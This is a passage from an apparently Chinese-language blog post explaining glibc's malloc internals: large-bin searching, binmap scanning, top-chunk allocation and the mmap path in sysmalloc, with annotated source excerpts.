class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><h5 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h5><p>到此处，先说明一下：</p><p>fast chunk的情况如果有就已经在开头返回了；</p><p>small chunk在开头就尝试从small bin中进行分配，如果没成功，上面在处理unsorted时又进行了一遍，如果还没有分配，说明大小没有一致的，只能后面尝试用更大的进行分配；</p><p>large chunk经过unsorted简单大小比较分配后，如果没有一致的chunk就进入下面large bin中尝试分配</p><p>这部分就是处理large chunk这种情况：</p><p>1.首先找到对应大小对应的large bin</p><p>2.然后判断，该large bin中是否有合适的chunk可分配（细节地处理是否为一种大小chunk的头chunk）</p><p>3.将victim从large bin中摘除，并且进行切割操作，如果太小就一起给了，如果还能剩下，那么剩下的部分就放到unsorted中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>  &#123;<br>    bin = bin_at (av, idx);<br><br>    <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>    <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>      &#123;<br>            victim = victim-&gt;bk_nextsize;<br>            <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>              victim = victim-&gt;bk_nextsize;<br><br>            <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">              list does not have to be rerouted.  */</span><br>            <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>              victim = victim-&gt;fd;<br><br>            remainder_size = size - nb;<br>            unlink (av, victim, bck, fwd);<br><br>            <span class="hljs-comment">/* Exhaust */</span><br>            <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>              &#123;<br>                set_inuse_bit_at_offset (victim, size);<br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                  victim-&gt;size |= NON_MAIN_ARENA;<br>              &#125;<br>            <span class="hljs-comment">/* Split */</span><br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                    remainder = chunk_at_offset (victim, nb);<br>                    <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                      have to perform a complete insert here.  */</span><br>                    bck = unsorted_chunks (av);<br>                    fwd = bck-&gt;fd;<br>                      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                      &#123;<br>                        errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                        <span class="hljs-keyword">goto</span> errout;<br>                      &#125;<br>                    remainder-&gt;bk = bck;<br>                    remainder-&gt;fd = fwd;<br>                    bck-&gt;fd = remainder;<br>                    fwd-&gt;bk = remainder;<br>                    <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                      &#123;<br>                        remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                      &#125;<br>                    set_head (victim, nb | PREV_INUSE |<br>                              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                    set_head (remainder, remainder_size | PREV_INUSE);<br>                    set_foot (remainder, remainder_size);<br>              &#125;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="for循环-1"><a href="#for循环-1" class="headerlink" title="for循环"></a>for循环</h5><p>到这里，说明前面都没有分配成功，对于small chunk和large chunk只能先尝试使用更大的chunk进行分配；</p><p>下面就是用更大的chunk来进行分配，从bin的角度去搜索</p><p>下面首先就是取相邻的bin，获取对应的block、map然后进入for循环</p><p>其实值得注意的是“bit &gt; map || bit &#x3D;&#x3D; 0”这个判断条件：</p><p>bit是当前bin对应bitmap中的位置，map是当前block的真实map值，这种情况好理解，bit&gt;map说明当前block中还有bin中存在chunk</p><p>bit &#x3D;&#x3D; 0 这个条件为了应对，下面那种误报情况，如果误报的bin恰好对应block中的31位(2^31的指数)，然后消除误报后，bit&lt;&lt;1此时会溢出为0</p><p>就是找到一个最接近的非空的bin，取其中bin-&gt;bk，进行尝试切割；这边还有主要就是如果申请的small chunk，切割剩下的chunk如果大小还能独自存在，那就将其设置为last_remainder</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs C">++idx;<br>bin = bin_at (av, idx);<br>block = idx2block (idx);<br><span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>bit = idx2bit (idx);<br><br><span class="hljs-keyword">for</span> (;; )<br>  &#123;<br>        <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>        <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>          &#123;<br>            <span class="hljs-keyword">do</span><br>              &#123;<br>                <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                  <span class="hljs-keyword">goto</span> use_top;<br>              &#125;<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>            bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>            bit = <span class="hljs-number">1</span>;<br>          &#125;<br><br>        <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>        <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>          &#123;<br>            bin = next_bin (bin);<br>            bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            assert (bit != <span class="hljs-number">0</span>);<br>          &#125;<br><br>        <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>        victim = last (bin);<br><br>        <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>        <span class="hljs-comment">//下面这种误报情况是有可能将bit置为0的，这种情况是bit已经到31位了，31位误报，bit&lt;&lt;1就会溢出变为0【这里31是指2^31】</span><br>        <span class="hljs-keyword">if</span> (victim == bin)<br>          &#123;<br>            av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><span class="hljs-comment">//清除该位</span><br>            bin = next_bin (bin);<span class="hljs-comment">//下一个bin，有可能一个block有多个bin可用</span><br>            bit &lt;&lt;= <span class="hljs-number">1</span>;<br>          &#125;<br><br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            size = chunksize (victim);<br><br>            <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>            assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>            remainder_size = size - nb;<br><br>            <span class="hljs-comment">/* unlink */</span><br>            unlink (av, victim, bck, fwd);<br><br>            <span class="hljs-comment">/* Exhaust */</span><br>            <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>              &#123;<br>                set_inuse_bit_at_offset (victim, size);<br>                <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                  victim-&gt;size |= NON_MAIN_ARENA;<br>              &#125;<br><br>            <span class="hljs-comment">/* Split */</span><br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                remainder = chunk_at_offset (victim, nb);<br><br>                <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                  have to perform a complete insert here.  */</span><br>                bck = unsorted_chunks (av);<br>                fwd = bck-&gt;fd;<br>                <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                &#123;<br>                    errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                    <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>                remainder-&gt;bk = bck;<br>                remainder-&gt;fd = fwd;<br>                bck-&gt;fd = remainder;<br>                fwd-&gt;bk = remainder;<br><br>                <span class="hljs-comment">/* advertise as last remainder */</span><br>                <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                  av-&gt;last_remainder = remainder;<br>                <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                  &#123;<br>                    remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                    remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                  &#125;<br>                set_head (victim, nb | PREV_INUSE |<br>                          (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                set_head (remainder, remainder_size | PREV_INUSE);<br>                set_foot (remainder, remainder_size);<br>              &#125;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h5 id="usetop"><a href="#usetop" class="headerlink" title="usetop"></a>usetop</h5><p>下面就是尝试使用top chunk了，</p><p>如果top能够进行分配，那么就会直接分配；</p><p>如果top空间不足会触发一次合并fast chunk操作，然后从头再进行尝试分配一次；</p><p>如果top空间不足且无fast chunk可合并，就只能尝试向系统进行申请了</p><p>这部分值得提出的是，if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE))，为什么要限制top chunk至少能保留MINSIZE呢？因为这个MINSIZE用来标记前面的chunk的使用状态，仅此而已。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C">use_top:<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If large enough, split off the chunk bordering the end of memory</span><br><span class="hljs-comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="hljs-comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="hljs-comment">     less well fitting) than any other available chunk since it can</span><br><span class="hljs-comment">     be extended to be as large as necessary (up to system</span><br><span class="hljs-comment">     limitations).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="hljs-comment">     MINSIZE) after initialization, so if it would otherwise be</span><br><span class="hljs-comment">     exhausted by current request, it is replenished. (The main</span><br><span class="hljs-comment">     reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="hljs-comment">     to put in fenceposts in sysmalloc.)</span><br><span class="hljs-comment">   */</span><br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br>  <span class="hljs-comment">//top chunk能直接分配所需的大小，这里要始终让top chunk至少能剩MINSIZE，为了标记前面的chunk</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>    &#123;<br>      remainder_size = size - nb;<br>      remainder = chunk_at_offset (victim, nb);<br>      av-&gt;top = remainder;<br>      set_head (victim, nb | PREV_INUSE |<br>                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      set_head (remainder, remainder_size | PREV_INUSE);<br><br>      check_malloced_chunk (av, victim, nb);<br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>  <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">     here for all block sizes.  */</span><br>  <span class="hljs-comment">//如果top chunk空间不足，就会触发尝试合并fast chunk，然后从头再来一次</span><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>    &#123;<br>      malloc_consolidate (av);<br>      <span class="hljs-comment">/* restore original bin index */</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>        idx = smallbin_index (nb);<br>      <span class="hljs-keyword">else</span><br>        idx = largebin_index (nb);<br>    &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-comment">//如果也没有fast chunk可以进行合并，那么就会尝试向系统申请</span><br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h4><h5 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h5><p>下面判断是否达到使用mmap分配的条件：1.av为空时；2.申请的大小能达到mmap的门槛</p><p>这里主要提几个注意点：</p><p>1.在调用mmap之前，ALIGN_UP (nb + SIZE_SZ：加个SIZE_SZ是因为正常的chunk是有相邻的chunk的，而且有一个共用部分pre_size字段。所以在使用mmap分配时，需要提前将这部分加上</p><p>2.通过mmap分配后，有可能会进行内存没对齐，又通过front_misalign来进行记录，最后将返回的地址向下移动差值即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs C">mchunkptr old_top;              <span class="hljs-comment">/* incoming value of av-&gt;top */</span><br>INTERNAL_SIZE_T old_size;       <span class="hljs-comment">/* its size */</span><br><span class="hljs-type">char</span> *old_end;                  <span class="hljs-comment">/* its end address */</span><br><br><span class="hljs-type">long</span> size;                      <span class="hljs-comment">/* arg to first MORECORE or mmap call */</span><br><span class="hljs-type">char</span> *brk;                      <span class="hljs-comment">/* return value from MORECORE */</span><br><br><span class="hljs-type">long</span> correction;                <span class="hljs-comment">/* arg to 2nd MORECORE call */</span><br><span class="hljs-type">char</span> *snd_brk;                  <span class="hljs-comment">/* 2nd return val */</span><br><br>INTERNAL_SIZE_T front_misalign; <span class="hljs-comment">/* unusable bytes at front of new space */</span><br>INTERNAL_SIZE_T end_misalign;   <span class="hljs-comment">/* partial page left at end of new space */</span><br><span class="hljs-type">char</span> *aligned_brk;              <span class="hljs-comment">/* aligned offset into brk */</span><br><br>mchunkptr p;                    <span class="hljs-comment">/* the allocated/returned chunk */</span><br>mchunkptr remainder;            <span class="hljs-comment">/* remainder from allocation */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;   <span class="hljs-comment">/* its size */</span><br><br><br><span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br><span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  If have mmap, and the request size meets the mmap threshold, and</span><br><span class="hljs-comment">  the system supports mmap, and there are few enough currently</span><br><span class="hljs-comment">  allocated mmapped regions, try to directly map this request</span><br><span class="hljs-comment">  rather than expanding top.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//主要是两种情况下会选择使用mmap：1.av为空；2.申请的大小已经达到使用mmap的门槛了</span><br><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>    || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br>  &#123;<br>        <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>      try_mmap:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Round up size to nearest page.  For mmapped chunks, the overhead</span><br><span class="hljs-comment">          is one SIZE_SZ unit larger than for normal chunks, because there</span><br><span class="hljs-comment">          is no following chunk whose prev_size field could be used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          See the front_misalign handling below, for glibc there is no</span><br><span class="hljs-comment">          need for further alignments unless we have have high alignment.</span><br><span class="hljs-comment">        */</span><br>       <span class="hljs-comment">//下面多一个size，是因为对于mapped chunk没有相邻的下一个chunk头部presize字段可用</span><br>        <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>          size = ALIGN_UP (nb + SIZE_SZ, pagesize);<br>        <span class="hljs-keyword">else</span><br>          size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>        tried_mmap = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>          &#123;<br>            mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>            <span class="hljs-keyword">if</span> (mm != MAP_FAILED)<br>              &#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                  The offset to the start of the mmapped region is stored</span><br><span class="hljs-comment">                  in the prev_size field of the chunk. This allows us to adjust</span><br><span class="hljs-comment">                  returned start address to meet alignment requirements here</span><br><span class="hljs-comment">                  and in memalign(), and still be able to compute proper</span><br><span class="hljs-comment">                  address argument for later munmap in free() and realloc().</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-comment">//下面这个是申请后，检查是否有没对齐的内存部分，用frot_misalign来记录</span><br>                <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                  &#123;<br>                    <span class="hljs-comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span><br><span class="hljs-comment">                      MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span><br><span class="hljs-comment">                      aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span><br>                    assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    front_misalign = <span class="hljs-number">0</span>;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;<br>                <br>                <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                  &#123;<br>                    <span class="hljs-comment">//correction记录还差多少能对齐，这里选择将申请来的地址向下移动差的字节进行对齐</span><br>                    correction = MALLOC_ALIGNMENT - front_misalign;<br>                    p = (mchunkptr) (mm + correction);<br>                    p-&gt;prev_size = correction;<br>                    set_head (p, (size - 